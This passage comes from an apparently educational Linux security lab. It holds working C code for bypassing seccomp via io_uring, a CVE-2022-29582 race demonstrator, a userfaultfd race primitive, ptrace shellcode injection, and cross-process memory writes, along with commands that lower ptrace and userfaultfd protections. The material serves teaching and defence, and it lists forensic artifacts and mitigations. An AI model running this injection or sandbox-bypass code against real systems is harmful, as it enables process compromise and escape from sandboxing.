    /* Also block io_uring_setup to prevent NEW rings */
    seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(io_uring_setup), 0);

    ret = seccomp_load(ctx);
    if (ret < 0) {
        fprintf(stderr, "seccomp_load: %s\n", strerror(-ret));
        seccomp_release(ctx);
        return 1;
    }
    seccomp_release(ctx);
    printf("[+] Seccomp filter active: openat BLOCKED, io_uring_setup BLOCKED\n");
    printf("    (but existing io_uring ring still works!)\n\n");

    /* Step 3: Verify direct openat is blocked */
    printf("[TEST 1] Direct openat(\"/etc/hostname\"): ");
    fd = open("/etc/hostname", O_RDONLY);
    if (fd < 0) {
        printf("BLOCKED (errno=%d: %s) ✓\n", errno, strerror(errno));
    } else {
        printf("ALLOWED — unexpected\n");
        close(fd);
    }

    /* Step 4: Bypass via io_uring — openat through SQE */
    printf("[TEST 2] io_uring IORING_OP_OPENAT(\"/etc/hostname\"): ");

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_openat(sqe, AT_FDCWD, "/etc/hostname", O_RDONLY, 0);
    sqe->user_data = 1;
    io_uring_submit(&ring);

    ret = io_uring_wait_cqe(&ring, &cqe);
    if (ret < 0) {
        printf("wait error: %s\n", strerror(-ret));
    } else if (cqe->res < 0) {
        printf("BLOCKED by kernel (res=%d: %s)\n",
               cqe->res, strerror(-cqe->res));
    } else {
        fd = cqe->res;
        printf("BYPASSED — got fd=%d ✗\n", fd);

        /* Step 5: Read through io_uring too */
        io_uring_cqe_seen(&ring, cqe);

        sqe = io_uring_get_sqe(&ring);
        io_uring_prep_read(sqe, fd, buf, BUF_SIZE - 1, 0);
        sqe->user_data = 2;
        io_uring_submit(&ring);

        ret = io_uring_wait_cqe(&ring, &cqe);
        if (ret == 0 && cqe->res > 0) {
            buf[cqe->res] = '\0';
            printf("[BYPASS] Read via io_uring: %s", buf);
        }
        io_uring_cqe_seen(&ring, cqe);

        /* Close via io_uring */
        sqe = io_uring_get_sqe(&ring);
        io_uring_prep_close(sqe, fd);
        sqe->user_data = 3;
        io_uring_submit(&ring);
        io_uring_wait_cqe(&ring, &cqe);
        io_uring_cqe_seen(&ring, cqe);
    }

    if (cqe) io_uring_cqe_seen(&ring, cqe);

    /* Step 6: Verify new io_uring_setup is blocked */
    printf("\n[TEST 3] New io_uring_setup: ");
    struct io_uring ring2;
    ret = io_uring_queue_init(8, &ring2, 0);
    if (ret < 0) {
        printf("BLOCKED (errno=%d: %s) ✓\n", -ret, strerror(-ret));
    } else {
        printf("ALLOWED — filter incomplete\n");
        io_uring_queue_exit(&ring2);
    }

    io_uring_queue_exit(&ring);

    printf("\n[*] KEY LESSON: Seccomp filters MUST block io_uring_setup,\n");
    printf("    io_uring_enter, AND io_uring_register to prevent bypass.\n");
    printf("    Pre-existing rings before filter installation remain usable.\n");
    printf("    Best practice: install seccomp BEFORE creating io_uring rings.\n");

    return 0;
}
```

**Build and run:**

```bash
gcc -o iouring_seccomp_bypass iouring_seccomp_bypass.c -luring -lseccomp
./iouring_seccomp_bypass
```

**Expected output:** Direct `openat` is blocked by seccomp. The io_uring `IORING_OP_OPENAT` succeeds because it does not traverse `entry_SYSCALL_64` — it goes through the io_uring worker context.

#### Step 3.2: io_uring CVE-2022-29582 UAF Race Demonstrator

```c
/* offensive/iouring_uaf_race.c
 * Educational demonstrator for the io_uring timeout UAF race pattern
 * (CVE-2022-29582). This does NOT achieve exploitation — it demonstrates
 * the race timing and detection artifacts.
 * Build: gcc -O2 -o iouring_uaf_race iouring_uaf_race.c -luring -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <liburing.h>
#include <time.h>

#define RING_SIZE 64
#define RACE_ITERATIONS 1000

static struct io_uring ring;
static volatile int race_ready = 0;
static volatile int race_count = 0;
static volatile int anomaly_count = 0;

static void *timeout_submitter(void *arg)
{
    struct io_uring_sqe *sqe;
    struct __kernel_timespec ts = { .tv_sec = 0, .tv_nsec = 1000000 }; /* 1ms */

    while (race_ready == 0) ;

    /* Submit NOP linked to a timeout */
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) return NULL;
    io_uring_prep_nop(sqe);
    sqe->flags |= IOSQE_IO_LINK;
    sqe->user_data = 0xAAAA;

    sqe = io_uring_get_sqe(&ring);
    if (!sqe) return NULL;
    io_uring_prep_timeout(sqe, &ts, 0, 0);
    sqe->user_data = 0xBBBB;

    io_uring_submit(&ring);
    return NULL;
}

static void *timeout_canceller(void *arg)
{
    struct io_uring_sqe *sqe;

    while (race_ready == 0) ;

    /* Small delay to let submission propagate */
    for (volatile int i = 0; i < 100; i++) ;

    sqe = io_uring_get_sqe(&ring);
    if (!sqe) return NULL;
    io_uring_prep_timeout_remove(sqe, 0xBBBB, 0);
    sqe->user_data = 0xCCCC;

    io_uring_submit(&ring);
    return NULL;
}

int main(void)
{
    struct io_uring_cqe *cqe;
    unsigned head;
    pthread_t t1, t2;
    int ret;

    printf("=== io_uring Timeout UAF Race Demonstrator ===\n");
    printf("Iterations: %d\n\n", RACE_ITERATIONS);

    ret = io_uring_queue_init(RING_SIZE, &ring, 0);
    if (ret < 0) {
        fprintf(stderr, "io_uring_queue_init: %s\n", strerror(-ret));
        return 1;
    }

    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);

    for (int i = 0; i < RACE_ITERATIONS; i++) {
        race_ready = 0;

        pthread_create(&t1, NULL, timeout_submitter, NULL);
        pthread_create(&t2, NULL, timeout_canceller, NULL);

        race_ready = 1;

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);

        /* Drain completions */
        int cqe_count = 0;
        io_uring_for_each_cqe(&ring, head, cqe) {
            cqe_count++;
            /* On vulnerable kernels, unexpected CQE results or
             * kernel crashes (KASAN reports) would appear here */
            if (cqe->res != 0 && cqe->res != -ECANCELED &&
                cqe->res != -ENOENT && cqe->res != -ETIME &&
                cqe->res != -EALREADY) {
                anomaly_count++;
                printf("[!] Iteration %d: anomalous CQE res=%d user_data=0x%llx\n",
                       i, cqe->res, (unsigned long long)cqe->user_data);
            }
        }
        io_uring_cq_advance(&ring, cqe_count);
        race_count++;

        if (i % 100 == 0) {
            printf("[*] Progress: %d/%d iterations, anomalies: %d\n",
                   i, RACE_ITERATIONS, anomaly_count);
        }
    }

    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) +
                     (end.tv_nsec - start.tv_nsec) / 1e9;

    printf("\n=== Results ===\n");
    printf("Completed: %d iterations in %.2f seconds\n", race_count, elapsed);
    printf("Anomalies: %d\n", anomaly_count);
    printf("Rate: %.0f iterations/sec\n", race_count / elapsed);

    if (anomaly_count == 0) {
        printf("\n[+] No anomalies — kernel is likely patched (5.18+)\n");
        printf("    On vulnerable kernels (5.15-5.17), you would see:\n");
        printf("    - KASAN use-after-free reports in dmesg\n");
        printf("    - Unexpected CQE results\n");
        printf("    - Potential kernel panic\n");
    }

    printf("\n[*] Check dmesg for KASAN/KFENCE reports:\n");
    printf("    dmesg | grep -E '(KASAN|KFENCE|BUG|io_uring)'\n");

    io_uring_queue_exit(&ring);
    return 0;
}
```

**Build and run:**

```bash
gcc -O2 -o iouring_uaf_race iouring_uaf_race.c -luring -lpthread
./iouring_uaf_race

# Check for kernel-level anomalies
dmesg | tail -50 | grep -E '(KASAN|KFENCE|BUG|use-after-free|io_uring)'
```

---

### Exercise 4: userfaultfd TOCTOU Exploitation Primitive

**Objective:** Understand how userfaultfd provides deterministic control over kernel TOCTOU race windows, and build the exploitation skeleton used in real kernel exploits.

```c
/* offensive/userfaultfd_toctou.c
 * Complete userfaultfd TOCTOU demonstration.
 * Shows deterministic race window control used by kernel exploits
 * (CVE-2016-0728, CVE-2021-22555, etc.).
 * Build: gcc -O2 -o userfaultfd_toctou userfaultfd_toctou.c -lpthread
 * Requires: sysctl vm.unprivileged_userfaultfd=1 (vulnerable config)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <fcntl.h>
#include <poll.h>
#include <errno.h>
#include <time.h>

#define PAGE_SIZE 4096

static int uffd;
static void *trap_page;
static volatile int handler_called = 0;
static struct timespec fault_time, supply_time;

/* Simulated "race window work" — in a real exploit, this is where
 * the attacker manipulates kernel heap state */
static void race_window_actions(void)
{
    printf("  [handler] === RACE WINDOW OPEN ===\n");
    printf("  [handler] Kernel thread is BLOCKED on copy_from_user\n");
    printf("  [handler] In a real exploit, attacker would:\n");
    printf("    1. Free target kernel object (trigger UAF)\n");
    printf("    2. Spray heap to reclaim freed object\n");
    printf("    3. Set up controlled data in reclaimed memory\n");
    printf("    4. Supply page with data that triggers the bug\n");

    /* Simulate work with measurable delay */
    usleep(500000);  /* 500ms — in real exploit, heap manipulation here */

    printf("  [handler] Race window work complete\n");
    printf("  [handler] === RACE WINDOW CLOSING ===\n");
}

static void *fault_handler_thread(void *arg)
{
    struct uffd_msg msg;
    struct uffdio_copy copy;
    struct pollfd pollfd;
    char page_data[PAGE_SIZE];

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    printf("[handler] Fault handler thread started, waiting...\n");

    if (poll(&pollfd, 1, 10000) <= 0) {
        perror("poll timeout");
        return NULL;
    }

    if (read(uffd, &msg, sizeof(msg)) != sizeof(msg)) {
        perror("read uffd");
        return NULL;
    }

    if (msg.event != UFFD_EVENT_PAGEFAULT) {
        fprintf(stderr, "Unexpected event: %d\n", msg.event);
        return NULL;
    }

    clock_gettime(CLOCK_MONOTONIC, &fault_time);
    handler_called = 1;

    printf("\n[handler] PAGE FAULT intercepted!\n");
    printf("  Address: %p\n", (void *)msg.arg.pagefault.address);
    printf("  Flags: 0x%llx (WP=%d, MINOR=%d)\n",
           (unsigned long long)msg.arg.pagefault.flags,
           !!(msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WP),
           !!(msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_MINOR));

    /* === The race window — kernel thread is blocked === */
    race_window_actions();

    /* Prepare the page contents the kernel will receive */
    memset(page_data, 0, PAGE_SIZE);

    /* In a real exploit, this data would be crafted to trigger
     * a specific vulnerability. For example:
     * - CVE-2021-22555: crafted iptables ruleset that causes OOB write
     * - CVE-2016-0728: data that triggers refcount manipulation
     * Here we just write a marker. */
    snprintf(page_data, PAGE_SIZE,
             "CONTROLLED_PAGE_DATA_FROM_HANDLER_AT_%ld",
             (long)time(NULL));

    /* Supply the page to unblock the kernel */
    copy.src = (unsigned long)page_data;
    copy.dst = msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    copy.len = PAGE_SIZE;
    copy.mode = 0;
    copy.copy = 0;

    if (ioctl(uffd, UFFDIO_COPY, &copy) < 0) {
        perror("UFFDIO_COPY");
        return NULL;
    }

    clock_gettime(CLOCK_MONOTONIC, &supply_time);
    double window_ms = (supply_time.tv_sec - fault_time.tv_sec) * 1000.0 +
                       (supply_time.tv_nsec - fault_time.tv_nsec) / 1e6;
    printf("\n[handler] Page supplied. Race window duration: %.1f ms\n", window_ms);

    return NULL;
}

int main(void)
{
    struct uffdio_api api;
    struct uffdio_register reg;
    pthread_t handler;

    printf("=== userfaultfd TOCTOU Exploitation Primitive ===\n\n");

    /* Check if userfaultfd is available to unprivileged users */
    int ufd_setting = -1;
    FILE *f = fopen("/proc/sys/vm/unprivileged_userfaultfd", "r");
    if (f) { fscanf(f, "%d", &ufd_setting); fclose(f); }
    printf("[*] vm.unprivileged_userfaultfd = %d\n", ufd_setting);
    if (ufd_setting == 0) {
        printf("[!] userfaultfd restricted — this is the SECURE setting.\n");
        printf("    To test (unsafe!): echo 1 > /proc/sys/vm/unprivileged_userfaultfd\n");
    }

    /* Create userfaultfd */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd < 0) {
        perror("userfaultfd");
        printf("[!] Failed — userfaultfd restricted (good for security)\n");
        return 1;
    }
    printf("[+] userfaultfd created: fd=%d\n", uffd);

    /* Negotiate API */
    api.api = UFFD_API;
    api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &api) < 0) {
        perror("UFFDIO_API");
        return 1;
    }
    printf("[+] API version: %llu, features: 0x%llx\n",
           (unsigned long long)api.api,
           (unsigned long long)api.features);

    /* Allocate trap page (will fault on first access) */
    trap_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (trap_page == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("[+] Trap page allocated at %p\n", trap_page);

    /* Register the page with userfaultfd */
    reg.range.start = (unsigned long)trap_page;
    reg.range.len = PAGE_SIZE;
    reg.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0) {
        perror("UFFDIO_REGISTER");
        return 1;
    }
    printf("[+] Page registered for missing-fault monitoring\n\n");

    /* Start fault handler thread */
    pthread_create(&handler, NULL, fault_handler_thread, NULL);

    /* Trigger the fault — in a real exploit, this would be done
     * by passing trap_page as an argument to a vulnerable syscall
     * (e.g., setsockopt, ioctl) that calls copy_from_user on it */
    printf("[main] Triggering page fault on trap page...\n");
    printf("[main] (In real exploit: syscall(__NR_target, trap_page, ...))\n\n");

    /* Read the page — triggers userfaultfd handler */
    volatile char c = *(volatile char *)trap_page;
    (void)c;

    /* Wait for handler to complete */
    pthread_join(handler, NULL);

    /* Verify the handler supplied the page */
    printf("\n[main] Page contents after fault handling:\n");
    printf("  Data: %.60s...\n", (char *)trap_page);

    /* Summary */
    printf("\n=== TOCTOU Summary ===\n");
    printf("The userfaultfd handler had FULL CONTROL during the race window.\n");
    printf("Any kernel thread blocked on copy_from_user for this page\n");
    printf("was suspended until the handler called UFFDIO_COPY.\n");
    printf("\nMitigation: vm.unprivileged_userfaultfd = 0 (default on modern distros)\n");
    printf("This restricts userfaultfd to CAP_SYS_PTRACE processes.\n");

    munmap(trap_page, PAGE_SIZE);
    close(uffd);
    return 0;
}
```

**Build and run:**

```bash
gcc -O2 -o userfaultfd_toctou userfaultfd_toctou.c -lpthread
./userfaultfd_toctou
```

---

### Exercise 5: ptrace Process Injection

**Objective:** Implement the complete ptrace-based code injection sequence (attach, save state, force mmap, write shellcode, redirect execution, detach) and understand its forensic artifacts.

#### Step 5.1: Target Process

```c
/* offensive/ptrace_target.c
 * Simple target process for injection exercises.
 * Build: gcc -o ptrace_target ptrace_target.c
 */
#include <stdio.h>
#include <unistd.h>
#include <signal.h>

static volatile int running = 1;

static void sigterm_handler(int sig) { running = 0; }

int main(void)
{
    signal(SIGTERM, sigterm_handler);
    printf("[target] PID: %d — waiting for injection...\n", getpid());
    fflush(stdout);

    while (running) {
        sleep(1);
    }

    printf("[target] Exiting normally\n");
    return 0;
}
```

#### Step 5.2: Injector

```c
/* offensive/ptrace_injector.c
 * Complete ptrace injection: attach → save regs → force mmap →
 * write shellcode → redirect RIP → wait → restore → detach.
 * Build: gcc -O2 -o ptrace_injector ptrace_injector.c
 * Usage: ./ptrace_injector <target_pid>
 * Requires: Yama ptrace_scope 0 or target is descendant
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>

/* x86_64 shellcode: write ">>> INJECTED <<<\n" to stdout, then int3 */
static unsigned char shellcode[] = {
    /* mov rax, 1 (sys_write) */
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,
    /* mov rdi, 1 (stdout) */
    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,
    /* lea rsi, [rip+msg] */
    0x48, 0x8d, 0x35, 0x15, 0x00, 0x00, 0x00,
    /* mov rdx, 18 (length of message) */
    0x48, 0xc7, 0xc2, 0x12, 0x00, 0x00, 0x00,
    /* syscall */
    0x0f, 0x05,
    /* int3 — return control to tracer */
    0xcc,
    /* Message: ">>> INJECTED <<<\n\0" */
    0x3e, 0x3e, 0x3e, 0x20, 0x49, 0x4e, 0x4a, 0x45,
    0x43, 0x54, 0x45, 0x44, 0x20, 0x3c, 0x3c, 0x3c,
    0x0a, 0x00,
};

static int poke_bytes(pid_t pid, unsigned long addr,
                      const void *data, size_t len)
{
    const unsigned char *src = data;
    for (size_t i = 0; i < len; i += sizeof(long)) {
        unsigned long word = 0;
        size_t chunk = (len - i < sizeof(long)) ? (len - i) : sizeof(long);
        memcpy(&word, src + i, chunk);
        if (ptrace(PTRACE_POKEDATA, pid, addr + i, word) < 0) {
            perror("PTRACE_POKEDATA");
            return -1;
        }
    }
    return 0;
}

static unsigned long find_syscall_gadget(pid_t pid, unsigned long rip)
{
    /* Try to find a 'syscall' (0x0f 0x05) near the current RIP.
     * In practice, the target is likely stopped inside a syscall
     * (nanosleep, read, etc.) so RIP-2 should point to the syscall
     * instruction that was just executed. */
    for (long offset = -16; offset <= 16; offset++) {
        long word = ptrace(PTRACE_PEEKDATA, pid, rip + offset, NULL);
        if (errno) continue;
        unsigned char *bytes = (unsigned char *)&word;
        for (int j = 0; j < (int)sizeof(long) - 1; j++) {
            if (bytes[j] == 0x0f && bytes[j + 1] == 0x05) {
                return rip + offset + j;
            }
        }
    }
    return 0;
}

int main(int argc, char *argv[])
{
    pid_t target;
    struct user_regs_struct saved_regs, work_regs;
    int status;

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }
    target = atoi(argv[1]);

    printf("=== ptrace Process Injection ===\n\n");

    /* Phase 1: Attach */
    printf("[1/7] Attaching to PID %d...\n", target);
    if (ptrace(PTRACE_ATTACH, target, NULL, NULL) < 0) {
        perror("PTRACE_ATTACH");
        if (errno == EPERM) {
            printf("[!] Permission denied. Check:\n");
            printf("    - Yama ptrace_scope: cat /proc/sys/kernel/yama/ptrace_scope\n");
            printf("    - Target UID matches yours\n");
            printf("    - Try: echo 0 > /proc/sys/kernel/yama/ptrace_scope (temp)\n");
        }
        return 1;
    }
    waitpid(target, &status, 0);
    printf("    Attached. Target stopped.\n");

    /* Phase 2: Save registers */
    printf("[2/7] Saving register state...\n");
    if (ptrace(PTRACE_GETREGS, target, NULL, &saved_regs) < 0) {
        perror("PTRACE_GETREGS");
        ptrace(PTRACE_DETACH, target, NULL, NULL);
        return 1;
    }
    printf("    RIP: 0x%016llx  RSP: 0x%016llx\n",
           saved_regs.rip, saved_regs.rsp);
    printf("    RAX: 0x%016llx  RDI: 0x%016llx\n",
           saved_regs.rax, saved_regs.rdi);

    /* Phase 3: Find syscall gadget */
    printf("[3/7] Locating syscall gadget...\n");
    unsigned long gadget = find_syscall_gadget(target, saved_regs.rip);
    if (!gadget) {
        printf("    No syscall gadget found near RIP. Using RIP-2.\n");
        gadget = saved_regs.rip - 2;
    } else {
        printf("    Found syscall (0f 05) at 0x%016lx\n", gadget);
    }

    /* Phase 4: Force mmap syscall */
    printf("[4/7] Forcing mmap(NULL, 4096, RWX, PRIVATE|ANON, -1, 0)...\n");
    work_regs = saved_regs;
    work_regs.rip = gadget;
    work_regs.rax = __NR_mmap;
    work_regs.rdi = 0;                                    /* addr */
    work_regs.rsi = 4096;                                 /* length */
    work_regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;  /* prot */
    work_regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;          /* flags */
    work_regs.r8  = (unsigned long long)-1;               /* fd */
    work_regs.r9  = 0;                                    /* offset */

    ptrace(PTRACE_SETREGS, target, NULL, &work_regs);
    ptrace(PTRACE_SINGLESTEP, target, NULL, NULL);
    waitpid(target, &status, 0);

    ptrace(PTRACE_GETREGS, target, NULL, &work_regs);
    unsigned long mmap_addr = work_regs.rax;

    if ((long long)mmap_addr < 0) {
        fprintf(stderr, "    mmap failed: %lld\n", (long long)mmap_addr);
        ptrace(PTRACE_SETREGS, target, NULL, &saved_regs);
        ptrace(PTRACE_DETACH, target, NULL, NULL);
        return 1;
    }
    printf("    mmap returned: 0x%016lx\n", mmap_addr);

    /* Phase 5: Write shellcode */
    printf("[5/7] Writing shellcode (%zu bytes)...\n", sizeof(shellcode));
    if (poke_bytes(target, mmap_addr, shellcode, sizeof(shellcode)) < 0) {
        ptrace(PTRACE_SETREGS, target, NULL, &saved_regs);
        ptrace(PTRACE_DETACH, target, NULL, NULL);
        return 1;
    }
    printf("    Shellcode written to 0x%016lx\n", mmap_addr);

    /* Phase 6: Redirect execution */
    printf("[6/7] Redirecting RIP to shellcode...\n");
    work_regs = saved_regs;
    work_regs.rip = mmap_addr;
    ptrace(PTRACE_SETREGS, target, NULL, &work_regs);
    ptrace(PTRACE_CONT, target, NULL, NULL);
    waitpid(target, &status, 0);

    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
        printf("    Shellcode executed (SIGTRAP received)\n");
    }

    /* Phase 7: Restore and detach */
    printf("[7/7] Restoring registers and detaching...\n");
    ptrace(PTRACE_SETREGS, target, NULL, &saved_regs);
    ptrace(PTRACE_DETACH, target, NULL, NULL);
    printf("    Detached. Target resumes normal execution.\n");

    /* Forensic artifacts summary */
    printf("\n=== Forensic Artifacts ===\n");
    printf("1. PTRACE_ATTACH event in auditd (pid=%d -> target=%d)\n",
           getpid(), target);
    printf("2. New RWX mapping at 0x%016lx in /proc/%d/maps\n",
           mmap_addr, target);
    printf("3. TracerPid was non-zero in /proc/%d/status during injection\n",
           target);
    printf("4. Shellcode bytes at 0x%016lx in target memory\n", mmap_addr);

    return 0;
}
```

**Build and run:**

```bash
# Terminal 1: Start target
gcc -o ptrace_target ptrace_target.c
./ptrace_target

# Terminal 2: Inject (need Yama scope 0 for non-descendant)
# For this lab only:
sudo sh -c 'echo 0 > /proc/sys/kernel/yama/ptrace_scope'

gcc -O2 -o ptrace_injector ptrace_injector.c
./ptrace_injector $(pidof ptrace_target)

# Reset Yama after exercise:
sudo sh -c 'echo 1 > /proc/sys/kernel/yama/ptrace_scope'
```

**Expected output:** The target process prints ">>> INJECTED <<<" on its stdout, then resumes normal operation. The injector logs all seven phases with addresses and register values.

#### Step 5.3: ptrace Syscall Redirection (Codeless Injection)

```c
/* offensive/ptrace_syscall_redirect.c
 * Redirects a target's syscalls by modifying registers at PTRACE_SYSCALL stops.
 * No code injection needed — just register manipulation.
 * Build: gcc -O2 -o ptrace_syscall_redirect ptrace_syscall_redirect.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

int main(int argc, char *argv[])
{
    pid_t pid;
    struct user_regs_struct regs, saved;
    int status;
    int entry = 1; /* toggle: 1 = entry stop, 0 = exit stop */

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }
    pid = atoi(argv[1]);

    printf("=== ptrace Syscall Redirection ===\n");
    printf("Attaching to PID %d, will intercept next syscall\n\n", pid);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("PTRACE_ATTACH");
        return 1;
    }
    waitpid(pid, &status, 0);

    /* Wait for next syscall entry */
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    waitpid(pid, &status, 0);

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    saved = regs;

    printf("[*] Intercepted syscall entry:\n");
    printf("    orig_rax (syscall NR): %lld\n", regs.orig_rax);
    printf("    rdi (arg1): 0x%llx\n", regs.rdi);
    printf("    rsi (arg2): 0x%llx\n", regs.rsi);

    /* Redirect: change the syscall to mmap */
    printf("\n[*] Redirecting to mmap(NULL, 4096, RWX, PRIVATE|ANON, -1, 0)\n");
    regs.orig_rax = SYS_mmap;
    regs.rdi = 0;
    regs.rsi = 4096;
    regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;
    regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
    regs.r8  = (unsigned long long)-1;
    regs.r9  = 0;

    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    /* Let the redirected syscall execute, stop at exit */
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    waitpid(pid, &status, 0);

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    printf("[*] mmap returned: 0x%llx in target\n", regs.rax);

    if ((long long)regs.rax > 0) {
        printf("[+] Successfully forced mmap in target without code injection!\n");
        printf("    New RWX page at 0x%llx — check /proc/%d/maps\n",
               regs.rax, pid);
    }

    /* Restore and detach */
    ptrace(PTRACE_SETREGS, pid, NULL, &saved);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    printf("[*] Restored registers, detached\n");

    return 0;
}
```

---

### Exercise 6: Cross-Process Memory Access

**Objective:** Use `process_vm_readv` and `process_vm_writev` to read and write another process's memory, understanding the access checks and forensic implications.

```c
/* offensive/cross_process_mem.c
 * Demonstrates process_vm_readv/writev for cross-process memory access.
 * Build: gcc -O2 -o cross_process_mem cross_process_mem.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/uio.h>
#include <errno.h>

int main(int argc, char *argv[])
{
    pid_t target_pid;
    unsigned long target_addr;
    char read_buf[256] = {0};

    if (argc < 3) {
        fprintf(stderr, "Usage: %s <pid> <hex_address> [write_string]\n", argv[0]);
        fprintf(stderr, "  Read mode:  %s 1234 0x7fff12345678\n", argv[0]);
        fprintf(stderr, "  Write mode: %s 1234 0x7fff12345678 INJECTED\n", argv[0]);
        return 1;
    }

    target_pid = atoi(argv[1]);
    target_addr = strtoull(argv[2], NULL, 0);

    printf("=== Cross-Process Memory Access ===\n");
    printf("Target PID: %d, Address: 0x%lx\n\n", target_pid, target_addr);

    /* Set up scatter-gather buffers */
    struct iovec local_iov = {
        .iov_base = read_buf,
        .iov_len = sizeof(read_buf)
    };
    struct iovec remote_iov = {
        .iov_base = (void *)target_addr,
        .iov_len = sizeof(read_buf)
    };

    if (argc == 3) {
        /* READ mode */
        ssize_t nread = process_vm_readv(target_pid,
                                          &local_iov, 1,
                                          &remote_iov, 1, 0);
        if (nread < 0) {
            perror("process_vm_readv");
            printf("[!] Failed — check Yama ptrace_scope and UID match\n");
            return 1;
        }

        printf("[+] Read %zd bytes from PID %d @ 0x%lx:\n", nread,
               target_pid, target_addr);
        printf("    Hex: ");
        for (int i = 0; i < (nread > 64 ? 64 : nread); i++)
            printf("%02x ", (unsigned char)read_buf[i]);
        printf("\n    ASCII: ");
        for (int i = 0; i < (nread > 64 ? 64 : nread); i++)
            printf("%c", (read_buf[i] >= 32 && read_buf[i] < 127) ?
                   read_buf[i] : '.');
        printf("\n");

    } else {
        /* WRITE mode */
        const char *write_data = argv[3];
        size_t write_len = strlen(write_data);

        local_iov.iov_base = (void *)write_data;
        local_iov.iov_len = write_len;
        remote_iov.iov_len = write_len;

        ssize_t nwritten = process_vm_writev(target_pid,
                                              &local_iov, 1,
                                              &remote_iov, 1, 0);
        if (nwritten < 0) {
            perror("process_vm_writev");
            return 1;
        }
        printf("[+] Wrote %zd bytes to PID %d @ 0x%lx\n",
               nwritten, target_pid, target_addr);
    }

    printf("\n[*] Forensic note: process_vm_readv/writev use\n");
    printf("    PTRACE_MODE_ATTACH_REALCREDS access check.\n");
    printf("    Yama ptrace_scope restrictions apply.\n");
    printf("    Auditd: -a always,exit -F arch=b64 -S process_vm_readv\n");
    printf("            -S process_vm_writev -k xprocess_mem\n");

    return 0;
}
```

---

### Exercise 7: Seccomp Filter Enumeration and Analysis

**Objective:** Extract and analyze active seccomp filters from running processes to audit sandbox configurations.

```python
#!/usr/bin/env python3
"""offensive/seccomp_enum.py
Enumerate and analyze seccomp filter status for all running processes.
Usage: sudo python3 seccomp_enum.py [--pid PID]
"""
import os
import sys
import re
import subprocess
from pathlib import Path

SECCOMP_MODES = {0: "disabled", 1: "strict", 2: "filter"}

HIGH_RISK_SYSCALLS = {
    "ptrace", "process_vm_readv", "process_vm_writev",
    "io_uring_setup", "io_uring_enter", "io_uring_register",
    "userfaultfd", "mount", "umount2", "pivot_root",
    "unshare", "setns", "init_module", "finit_module",
    "delete_module", "kexec_load", "kexec_file_load",
    "bpf", "perf_event_open"
}

class ProcessSeccomp:
    def __init__(self, pid):
        self.pid = pid
        self.name = "unknown"
        self.seccomp_mode = 0
        self.filter_count = 0
        self.uid = -1
        self.in_container = False
        self._parse_status()
        self._check_container()

    def _parse_status(self):
        try:
            status = Path(f"/proc/{self.pid}/status").read_text()
            m = re.search(r'^Name:\s+(.+)$', status, re.M)
            if m: self.name = m.group(1)
            m = re.search(r'^Seccomp:\s+(\d+)', status, re.M)
            if m: self.seccomp_mode = int(m.group(1))
            m = re.search(r'^Seccomp_filters:\s+(\d+)', status, re.M)
            if m: self.filter_count = int(m.group(1))
            m = re.search(r'^Uid:\s+(\d+)', status, re.M)
            if m: self.uid = int(m.group(1))
        except (FileNotFoundError, PermissionError):
            pass

    def _check_container(self):
        try:
            cgroup = Path(f"/proc/{self.pid}/cgroup").read_text()
            self.in_container = "docker" in cgroup or "containerd" in cgroup or \
                               "lxc" in cgroup or "kubepods" in cgroup
        except (FileNotFoundError, PermissionError):
            pass

    def has_rwx_maps(self):
        try:
            maps = Path(f"/proc/{self.pid}/maps").read_text()
            return "rwxp" in maps
        except (FileNotFoundError, PermissionError):
            return False

    def get_tracer(self):
        try:
            status = Path(f"/proc/{self.pid}/status").read_text()
            m = re.search(r'^TracerPid:\s+(\d+)', status, re.M)
            if m: return int(m.group(1))
